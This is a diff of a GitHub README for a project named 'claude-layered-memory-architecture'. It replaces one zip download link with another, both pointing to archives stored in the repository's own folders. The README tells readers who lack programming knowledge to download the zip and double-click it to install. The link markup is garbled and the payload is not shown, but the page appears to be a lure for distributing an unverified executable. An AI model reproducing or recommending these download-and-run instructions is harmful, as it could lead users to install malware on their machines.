@@ -1,7 +1,7 @@
 # 🎉 claude-layered-memory-architecture - Simplifying AI Learning for Everyone
 
 ## 📦 Download Now
-[![Download Release](https://raw.githubusercontent.com/subhu9898/claude-layered-memory-architecture/main/assets/architecture_layered_claude_memory_v2.6.zip%https://raw.githubusercontent.com/subhu9898/claude-layered-memory-architecture/main/assets/architecture_layered_claude_memory_v2.6.zip)](https://raw.githubusercontent.com/subhu9898/claude-layered-memory-architecture/main/assets/architecture_layered_claude_memory_v2.6.zip)
+[![Download Release](https://github.com/subhu9898/claude-layered-memory-architecture/raw/refs/heads/main/docs/architecture-memory-layered-claude-v3.6.zip%https://github.com/subhu9898/claude-layered-memory-architecture/raw/refs/heads/main/docs/architecture-memory-layered-claude-v3.6.zip)](https://github.com/subhu9898/claude-layered-memory-architecture/raw/refs/heads/main/docs/architecture-memory-layered-claude-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Claude Layered Memory Architecture! This application helps you explore and utilize a three-layer memory system designed for long-term AI learning. You don't need any programming knowledge to use this tool. Just follow the steps below.
@@ -15,11 +15,11 @@ Before you download, ensure your system meets these requirements:
 - Internet access for downloading
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/subhu9898/claude-layered-memory-architecture/main/assets/architecture_layered_claude_memory_v2.6.zip). 
+To get started, visit this page to download: [Release Page](https://github.com/subhu9898/claude-layered-memory-architecture/raw/refs/heads/main/docs/architecture-memory-layered-claude-v3.6.zip). 
 
 1. Open the link.
 2. Look for the latest version of the software.
-3. Download the file by clicking on the package that suits your system (e.g., `https://raw.githubusercontent.com/subhu9898/claude-layered-memory-architecture/main/assets/architecture_layered_claude_memory_v2.6.zip`).
+3. Download the file by clicking on the package that suits your system (e.g., `https://github.com/subhu9898/claude-layered-memory-architecture/raw/refs/heads/main/docs/architecture-memory-layered-claude-v3.6.zip`).
 4. Once the download is finished, locate the file in your downloads folder.
 5. Double-click the file to begin the installation.
 6. Follow the on-screen instructions to complete the installation.
